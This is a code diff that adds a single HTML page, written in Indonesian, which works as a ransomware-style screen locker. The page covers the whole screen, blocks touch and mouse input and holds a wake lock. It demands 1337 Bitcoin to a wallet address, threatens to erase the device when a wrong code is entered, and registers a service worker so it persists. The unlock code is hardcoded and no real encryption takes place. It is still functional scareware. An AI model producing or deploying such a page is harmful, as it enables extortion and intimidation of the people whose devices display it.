@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Kamu Terkunci wkwkwk</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: black;
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: 9999999999;
+            pointer-events: none;
+        }
+        #overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999999998;
+        }
+        #popup {
+            position: absolute;
+            top: 25%; left: 25%;
+            width: 50%;
+            padding: 40px;
+            background: #222;
+            color: red;
+            border: 5px solid red;
+            box-shadow: 0 0 30px red;
+            animation: blink 1s infinite;
+            pointer-events: auto;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div id="popup">
+        <h1>MAMPUS LU PERANGKAT KAMU ADA DI TANGAN KAMI!</h1>
+        <p>Kirimkan 1337 Bitcoin ke alamat: <br><b>1BvBMSEYstWetqTrhLhJ9RwTkPcrB79Z8a</b></p>
+        <input type="password" id="code" placeholder="Masukkan kode...">
+        <button onclick="checkCode()">Submit</button>
+    </div>
+
+    <script>
+        // Blokir semua interaksi layar
+        document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
+        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+        document.addEventListener('mousedown', e => e.preventDefault(), { passive: false });
+
+        // Jangan izinkan layar mati
+        setInterval(() => {
+            navigator.wakeLock.request('screen');
+        }, 1000);
+
+        function checkCode() {
+            const code = document.getElementById('code').value;
+            if (code === '1337') {
+                alert('Anda telah diselamatkan. Jangan kembali ke halaman ini!');
+                window.close();
+            } else {
+                document.getElementById('popup').innerHTML = `
+                    <h1>KODE SALAH!</h1>
+                    <p>Anda akan terhapus dalam 3 detik...</p>
+                `;
+                setTimeout(() => {
+                    location.reload();
+                }, 3000);
+            }
+        }
+
+        // Simpan state bahkan saat tab ditutup
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(reg => {
+                reg.update();
+            });
+        }
+    </script>
+</body>
+</html>
